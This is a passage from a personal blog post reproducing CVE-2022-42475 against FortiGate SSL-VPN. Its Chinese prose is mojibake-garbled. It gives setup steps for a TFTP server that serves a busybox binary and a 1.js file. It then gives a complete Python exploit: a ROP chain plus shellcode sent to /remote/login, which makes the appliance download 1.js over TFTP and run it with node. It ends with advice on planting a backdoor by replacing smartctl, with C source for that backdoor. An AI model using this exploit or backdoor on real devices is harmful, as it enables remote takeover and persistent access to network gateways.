&#125;);
</code></pre>
<p>æœ€ç»ˆ å†æ¬¡åˆ©ç”¨å‘½ä»¤æ‰§è¡Œæ‰§è¡Œ nodejs 1.js æˆåŠŸå®Œæˆåˆ©ç”¨</p>
<p>ä»€ä¹ˆï¼Ÿä½ çªç„¶äº§ç”Ÿç–‘é—®ï¼Ÿtftp æœåŠ¡å™¨æ€ä¹ˆæ­å»ºå‘¢ï¼Ÿï¼Ÿ</p>
<h3 id="TFTP-æœåŠ¡å™¨æ­å»º"><a href="#TFTP-æœåŠ¡å™¨æ­å»º" class="headerlink" title="TFTP æœåŠ¡å™¨æ­å»º"></a>TFTP æœåŠ¡å™¨æ­å»º</h3><pre><code>sudo apt-get install xinetd
sudo apt-get install tftp tftpd
sudo vim /etc/xinetd.d/tftp
</code></pre>
<p>ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œä¸»è¦æ”¹ç›®å½•</p>
<pre><code>service tftp
&#123;
        socket_type             = dgram
        protocol                = udp
        wait                    = yes
        user                    = root
        server                  = /usr/sbin/in.tftpd    //æœåŠ¡ç¨‹åºè·¯å¾„
        server_args             = -s /home/ios/tftpboot/    //å¯ä»¥è®¿é—®çš„tftpdæœåŠ¡å™¨ä¸‹çš„ç›®å½•
        disable                 = no            //æ˜¯å¦å¼€æœºå¯åŠ¨
        per_source              = 11
        cps                     = 100 2
        flags                   = IPv4
&#125;
</code></pre>
<p>æ–°å»ºç›®å½•</p>
<pre><code>mkdir /home/ios/tftpboot/
æ¥ç€æŠŠéœ€è¦ç”¨åˆ°çš„ä¸¤ä¸ªæ–‡ä»¶å¤åˆ¶è¿›å»
cp busybox /home/ios/tftpboot/
cp 1.js /home/ios/tftpboot/
</code></pre>
<p>æå®š</p>
<h3 id="æœ€ç»ˆç¨³å®šçš„-Real-EXPï¼ï¼ï¼"><a href="#æœ€ç»ˆç¨³å®šçš„-Real-EXPï¼ï¼ï¼" class="headerlink" title="æœ€ç»ˆç¨³å®šçš„ Real EXPï¼ï¼ï¼"></a>æœ€ç»ˆç¨³å®šçš„ Real EXPï¼ï¼ï¼</h3><pre><code>import socket
import time
import ssl
from struct import pack

def int_to_bytes(n, minlen=0):
    &quot;&quot;&quot; Convert integer to bytearray with optional minimum length. 
    &quot;&quot;&quot;
    if n &gt; 0:
        arr = []
        while n:
            n, rem = n &gt;&gt; 8, n &amp; 0xff
            arr.append(rem)
        b = bytearray(arr)
    elif n == 0:
        b = bytearray(b&#39;\x00&#39;)
    else:
        raise ValueError(&#39;Only non-negative values supported&#39;)

    if minlen &gt; 0 and len(b) &lt; minlen: # zero padding needed?
        b = (minlen-len(b)) * &#39;\x00&#39; + b
    return b
def setp1():
    print(&quot;current step: download 1.js&quot;)
    path = &quot;/remote/login&quot;.encode()
    CL=0x1b00000000
    # push rdx ; pop rsp ; add edi, edi ; nop ; ret
    gadget1 = 0x000000000140583a
    try:
        payload = b&quot;B&quot;*2400
        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret
        payload += int_to_bytes(0xfffffffffffa9688) # offset
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 # #push rdx; pop rdi; ret;
        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5 # : pop rsi ; ret
        payload += int_to_bytes(0x258000) + b&quot;\x00&quot;*5
        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5 # : pop rdx ; ret
        payload += int_to_bytes(0x7) + b&quot;\x00&quot;*7       
        payload += int_to_bytes(0x1537F26) + b&quot;\x00&quot;*4 # jmp _mprotect

        payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # pop rax ; ret
        payload += int_to_bytes(0x56a40) + b&quot;\x00&quot;*5 # offset to stack
        payload += int_to_bytes(0x7d4f4d) + b&quot;\x00&quot;*5 # add rax, rdi ; ret
        payload += int_to_bytes(0x43dccc) + b&quot;\x00&quot;*5 # push rax ; ret
        
        print(len(payload))
        raw = payload+b&quot;A&quot;*(2592-len(payload))
        raw += int_to_bytes(gadget1) +b&quot;\x00&quot;*4
        
        raw += b&#39;H\x81\xec\x00\x10\x00\x00j\x00H\xbboctet\x00\x00\x00SI\x89\xe1H\xc7\xc3get\x00SI\x89\xe0H\xc7\xc31.jsSH\x89\xe1H\xbb109.128\x00SH\xbb192.168.SH\x89\xe2H\xc7\xc3p\x00\x00\x00SH\xbb/bin/tftSH\x89\xe6H\x89\xe7j\x00H\xbb/sbin/buSI\x89\xe2H\x05\x90\x00\x00\x00H\x89\xc4ARH\x83\xec\x08\x90\xc3&#39;

        raw += int_to_bytes(0x161DB33) +b&quot;\x00&quot;*4 # call execl
        
        
        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.109.111\r\nContent-Length: &quot; + str(int(CL)).encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;+raw
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.connect((&quot;192.168.109.111&quot;, 4443))
        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        _socket = _default_context.wrap_socket(_socket)
        _socket.sendall(data)

    except Exception as e:
        print(e)

def setp2():
    print(&quot;current step: execute 1.js&quot;)
    path = &quot;/remote/login&quot;.encode()
    CL=0x1b00000000
    # push rdx ; pop rsp ; add edi, edi ; nop ; ret
    gadget1 = 0x000000000140583a
    try:
        payload = b&quot;B&quot;*2400
        payload += int_to_bytes(0x60b30e)+ b&quot;\x00&quot;*5 # : pop rax ; pop rcx ; ret
        payload += int_to_bytes(0xfffffffffffa9688) # offset
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2608366) + b&quot;\x00&quot;*4  #junk op, add r13, r8 ; ret
        payload += int_to_bytes(0x2a0e1c0) + b&quot;\x00&quot;*4 # add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
        payload += int_to_bytes(0x257016a) + b&quot;\x00&quot;*4 # #push rdx; pop rdi; ret;
        payload += int_to_bytes(0x530c9e) + b&quot;\x00&quot;*5 # : pop rsi ; ret
        payload += int_to_bytes(0x258000) + b&quot;\x00&quot;*5
        payload += int_to_bytes(0x509382) + b&quot;\x00&quot;*5 # : pop rdx ; ret
        payload += int_to_bytes(0x7) + b&quot;\x00&quot;*7       
        payload += int_to_bytes(0x1537F26) + b&quot;\x00&quot;*4 # jmp _mprotect

        payload += int_to_bytes(0x46bb37) + b&quot;\x00&quot;*5 # pop rax ; ret
        payload += int_to_bytes(0x56a40) + b&quot;\x00&quot;*5 # offset to stack
        payload += int_to_bytes(0x7d4f4d) + b&quot;\x00&quot;*5 # add rax, rdi ; ret
        payload += int_to_bytes(0x43dccc) + b&quot;\x00&quot;*5 # push rax ; ret
        
        print(len(payload))
        raw = payload+b&quot;A&quot;*(2592-len(payload))
        raw += int_to_bytes(gadget1) +b&quot;\x00&quot;*4
        # ret2shellcode
        raw += b&#39;H\x81\xec\x00\x10\x00\x00H\xc7\xc1\x00\x00\x00\x00H\xbb/sbin/buSH\x89\xe2H\xc7\xc3e\x00\x00\x00SH\xbb/bin/nodSH\x89\xe6H\x89\xe7H\x83\xc0@H\x89\xc4\x90\x90\x90\xc3&#39;
        # rop to execl
        raw += int_to_bytes(0x161DB33) +b&quot;\x00&quot;*4 # call execl
        
        
        data = b&quot;POST &quot; + path + b&quot; HTTP/1.1\r\nHost: 192.168.109.111\r\nContent-Length: &quot; + str(int(CL)).encode() + b&quot;\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n&quot;+raw
        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.connect((&quot;192.168.109.111&quot;, 4443))
        _default_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        _socket = _default_context.wrap_socket(_socket)
        _socket.sendall(data)
    except Exception as e:
        print(e)

def main():
    #step1 = b&quot;tftp 192.168.109.128 1.js get octet /sbin/bu&quot;
    for i in range(10):
        time.sleep(0.1)
        setp1()
    #step2 = b&quot;/bin/node /sbin/bu&quot;
    time.sleep(10) #wait for sslvpn reboot
    for i in range(10):
        time.sleep(0.1)
        setp2()
main()
</code></pre>
<h3 id="å¯èƒ½å­˜åœ¨çš„é—®é¢˜"><a href="#å¯èƒ½å­˜åœ¨çš„é—®é¢˜" class="headerlink" title="å¯èƒ½å­˜åœ¨çš„é—®é¢˜"></a>å¯èƒ½å­˜åœ¨çš„é—®é¢˜</h3><ol>
<li>å‘é€ exp å¤±è´¥ï¼Œéœ€è¦ä½ç‰ˆæœ¬çš„ python+ ä½ç‰ˆæœ¬çš„ linux ç¯å¢ƒï¼Œè¿™é‡Œç”¨çš„æ˜¯ python2</li>
<li>exp æ²¡ç”Ÿæ•ˆï¼Ÿ å¯ä»¥è€ƒè™‘æ‰“å®Œ step1 åç­‰å¾…ä¸€æ®µæ—¶é—´ 5-10s åå†æ‰§è¡Œ step2</li>
<li>ä¸ºä»€ä¹ˆè¦åˆ†å¼€æ„é€  shellcodeï¼Ÿä¸ºä½•ä¸ä¸€æ¬¡æ„é€ å®Œæˆ</li>
</ol>
<p>è¿™ä¹ˆè€ƒè™‘çš„ç‚¹æ˜¯è¿™æ ·çš„ï¼Œé¦–å…ˆæ‰§è¡Œ execl åä¼šåŠ«æŒç¨‹åºï¼Œæ‰§è¡ŒæˆåŠŸåä¸ä¼šè¿”å›é”™è¯¯ä¼šç›´æ¥é€€å‡ºç¨‹åºï¼Œè€Œä¸Šè¿° payload ä¸­æ²¡æœ‰ç”¨åˆ° fork æ¥åˆ›å»ºè¿›ç¨‹ï¼Œä»è€Œç¨‹åºæ‰§è¡Œå®Œ execl åä¼šé€€å‡ºï¼Œæ— æ³•ç»§ç»­è·³è½¬å›åŸæ¥çš„ payload ç»§ç»­ rop æˆ–è€… ret2shellcodeã€‚</p>
<ol>
<li>æœ‰æ²¡æœ‰ç®€å•çš„æ‹¿åé—¨æ–¹æ³•ï¼Ÿæœ‰æ›¿æ¢ smartctl ä¸ºä½ çš„åé—¨ binaryï¼Œæ¥ç€åœ¨ç™»å½•åæ‰§è¡Œ <code>diagnose hardware smartctl arg1 arg2 ...</code> çš„æ–¹å¼æ‰§è¡Œ</li>
</ol>
<p>è¿™é‡Œæä¾›ä¸€ä¸ªç®€å•çš„</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
# gcc -g -static s.c -o s
int main(int argc, char const *argv[])
&#123;
        execl(argv[1], argv[1], argv[2], argv[3], argv[4], argv[5], argv[6], NULL);
        return 0;
&#125;
</code></pre>

        </div>

    </div>

    

    

    

    

    

    
<nav class="article-nav">
  
    <a href="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/" id="article-nav-newer" class="article-nav-link-wrap">
      <div class="article-nav-caption">prossimo</div>
      <div class="article-nav-title">
        
          libnvram.soç¼–è¯‘æ•™ç¨‹
        
      </div>
    </a>
  
  
    <a href="/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-caption">precedente</div>
      <div class="article-nav-title">gdb-serveré…ç½®</div>
    </a>
  
</nav>


    <section class="share">
        <div class="share-title">share</div>
        <a class="share-item" target="_blank"
            href="https://twitter.com/share?text=CVE-2022-42475 - ioo0s's blog&url=http%3A%2F%2Fioo0s.art%2F2023%2F02%2F09%2FCVE-2022-42475%2F">
            <ion-icon name="logo-twitter"></ion-icon>
        </a>
        <a class="share-item" target="_blank"
            href="https://www.facebook.com/sharer.php?title=CVE-2022-42475 - ioo0s's blog&u=http%3A%2F%2Fioo0s.art%2F2023%2F02%2F09%2FCVE-2022-42475%2F">
            <ion-icon name="logo-facebook"></ion-icon>
        </a>
        <!-- <a class="share-item" target="_blank"
            href="https://service.weibo.com/share/share.php?title=CVE-2022-42475 - ioo0s's blog&url=http://ioo0s.art/2023/02/09/CVE-2022-42475/&pic=">
            <div class="n-icon n-icon-weibo"></div>
        </a> -->
    </section>

</article>
















<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

</div>
                </section>
            </section>

            
            <aside class="sidebar ">
                


<div class="widget" id="widget">
    
      
  <div class="widget-wrap">
    <div class="widget-inner">
      <div class="toc post-toc-html"></div>
    </div>
  </div>

    
      
  <div class="widget-wrap widget-cate">
    <div class="widget-title"><span>Categories</span></div>
    <div class="widget-inner">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">åŸºç¡€çŸ¥è¯†</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">æ¼æ´æŒ–æ˜</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">é€†å‘å·¥ç¨‹</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap widget-tags">
    <div class="widget-title"><span>Tags</span></div>
    <div class="widget-inner">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASUS/" rel="tag">ASUS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FortiGate/" rel="tag">FortiGate</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IOT/" rel="tag">IOT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ios%E9%80%86%E5%90%91/" rel="tag">iosé€†å‘</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%B8%E6%88%8F%E7%A0%B4%E8%A7%A3/" rel="tag">æ¸¸æˆç ´è§£</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">æ¼æ´å¤ç°</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap widget-recent-posts">
    <div class="widget-title"><span>Recent Posts</span></div>
    <div class="widget-inner">
      <ul>
        
          <li>
            <a href="/2023/02/20/libnvram-so%E7%BC%96%E8%AF%91%E6%95%99%E7%A8%8B/">libnvram.soç¼–è¯‘æ•™ç¨‹</a>
          </li>
        
          <li>
            <a href="/2023/02/09/CVE-2022-42475/">CVE-2022-42475</a>
          </li>
        
          <li>
            <a href="/2023/02/09/gdb-server%E9%85%8D%E7%BD%AE/">gdb-serveré…ç½®</a>
          </li>
        
          <li>
            <a href="/2023/02/07/Note/">Note</a>
          </li>
        
          <li>
            <a href="/2023/02/07/%E5%88%A9%E7%94%A8VMware%E8%8E%B7%E5%8F%96shell-%E8%BF%9B%E9%98%B6/">åˆ©ç”¨VMwareè·å–shell-è¿›é˜¶</a>
          </li>
        
      </ul>
    </div>
  </div>

    
      
  <div class="widget-wrap widget-archive">
    <div class="widget-title"><span>Archive</span></div>
    <div class="widget-inner">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a></li></ul>
    </div>
  </div>


    
</div>

<div id="backtop"><i class="icon icon-arrow-up"></i></div>
            </aside>
            
        </div>
    </div>

    <footer class="footer">
    <div class="footer-wave">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
    </div>

    <!-- Please do not remove this -->
    <!-- å¼€æºä¸æ˜“ï¼Œè¯·å‹¿åˆ é™¤ -->
    <div class="footer-wrap">
        <div class="footer-inner"> 
            ioo0s&#39;s blog &copy; 2023<br>
            Powered By Hexo Â· Theme By Aomori
        </div>
    </div>

</footer>

<script type="module" src="https://unpkg.com/ionicons@6.0.2/dist/ionicons/ionicons.esm.js"></script>






<script src="/dist/build.js?1654266144177.js"></script>


<script src="/dist/custom.js?1654266144177.js"></script>



<!-- ç™¾åº¦é“¾æ¥æäº¤ -->
<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>











</body>

</html>